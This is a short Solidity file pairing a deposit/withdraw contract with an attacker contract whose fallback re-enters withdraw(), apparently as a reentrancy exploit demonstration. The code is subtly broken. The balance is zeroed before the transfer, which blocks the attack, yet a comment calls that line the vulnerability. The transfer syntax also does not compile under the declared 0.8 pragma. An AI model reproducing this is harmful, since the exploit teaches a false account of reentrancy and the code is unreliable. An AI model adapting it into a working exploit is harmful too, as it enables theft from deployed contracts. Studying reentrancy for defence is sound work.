pragma solidity ^0.8.0;

contract VulnerableContract {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint amount = balances[msg.sender];
        balances[msg.sender] = 0; // Update balance before transfer
        (bool success, ) = msg.sender.call.value(amount)(""); // Reentrancy vulnerability
        require(success, "Transfer failed.");
    }
}

contract AttackingContract {
    VulnerableContract public vulnerableContract;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = VulnerableContract(_vulnerableContractAddress);
    }

    fallback() external payable {
        if (address(vulnerableContract).balance > 0) {
            vulnerableContract.withdraw();
        }
    }

    function attack() external payable {
        vulnerableContract.deposit{value: msg.value}();
        vulnerableContract.withdraw();
    }
}
